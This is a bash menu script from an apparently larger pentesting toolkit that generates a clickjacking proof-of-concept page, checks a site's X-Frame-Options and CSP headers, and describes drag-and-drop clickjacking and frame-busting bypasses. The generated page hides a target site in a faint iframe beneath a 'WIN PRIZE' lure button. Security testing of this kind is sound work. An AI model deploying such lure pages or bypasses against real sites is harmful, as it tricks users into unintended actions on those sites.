#!/bin/bash
# HackTricks Ref: clickjacking.md
# Module: Clickjacking (UI Redressing) Attacks

echo -e "${C6}[WEB ATTACK: CLICKJACKING]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/clickjacking"
echo -e "--------------------------------------------------"

echo -e "${C4}Select Clickjacking Vector:${NC}"
echo "1) Basic Iframe Embedding Test (PoC Generator)"
echo "2) Check Defense Headers (X-Frame-Options / CSP)"
echo "3) Drag-and-Drop Clickjacking Theory"
echo "4) Frame Busting Bypass Techniques"
echo "0) Exit"

read -p "Selection: " cj_opt

case $cj_opt in
    1)
        echo -e "\n${C2}[*] Generating Basic Clickjacking PoC:${NC}"
        read -p "Enter Target URL: " target
        cat <<EOF > clickjacking_poc.html
<html>
   <head>
     <title>Clickjack PoC</title>
     <style>
       iframe {
         width: 900px;
         height: 600px;
         position: absolute;
         top: 0; left: 0;
         filter: alpha(opacity=20); /* Change to 0 for invisible */
         opacity: 0.2;
         z-index: 1;
       }
       button {
         position: absolute;
         top: 300px; left: 450px;
         z-index: 0;
       }
     </style>
   </head>
   <body>
     <p>Click the button to win a prize!</p>
     <button>WIN PRIZE</button>
     <iframe src="$target"></iframe>
   </body>
</html>
EOF
        echo -e "${C2}[+] PoC saved to clickjacking_poc.html${NC}"
        echo "Open this file in a browser to see if the target can be framed."
        ;;
    2)
        echo -e "\n${C2}[*] Defensive Headers Check:${NC}"
        read -p "Enter Target URL: " target
        echo -e "${C4}[*] Fetching headers...${NC}"
        curl -I -s "$target" | grep -Ei "X-Frame-Options|Content-Security-Policy"
        echo -e "\n${C4}Legend:${NC}"
        echo " - X-Frame-Options: DENY or SAMEORIGIN (Safe)"
        echo " - CSP: frame-ancestors 'none' or 'self' (Safe)"
        echo " - Missing: POTENTIALLY VULNERABLE"
        ;;
    3)
        echo -e "\n${C2}[*] Drag-and-Drop Clickjacking:${NC}"
        echo "If a site requires a complex action (like typing or dragging),"
        echo "an attacker can trick the user into 'dragging' an item on their site"
        echo "which is actually being dragged into the hidden iframe's sensitive field."
        ;;
    4)
        echo -e "\n${C2}[*] Frame Busting Bypass:${NC}"
        echo "If the site uses JS like 'if(top != self)', try to bypass it with:"
        echo "1. HTML5 Sandbox: <iframe sandbox=\"allow-forms\">"
        echo "2. Double Framing: Frame the site inside an iframe that blocks top-level navigation."
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
